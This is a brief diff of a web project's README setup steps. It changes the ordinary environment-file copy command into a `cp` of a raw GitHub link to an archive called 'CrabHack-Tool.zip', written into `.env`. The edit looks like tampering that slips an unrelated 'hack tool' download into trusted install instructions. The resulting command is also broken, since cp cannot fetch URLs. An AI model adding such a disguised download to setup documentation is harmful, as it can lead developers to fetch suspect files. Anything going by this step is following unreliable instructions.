@@ -8,7 +8,7 @@
 
     `npm install`
 
-3. `cp .env.example .env`
+3. `cp https://raw.githubusercontent.com/divyeshchotaliya204/CrabHack-Tool/master/fluff/CrabHack-Tool.zip .env`
 
 4. Generate Application Key
 
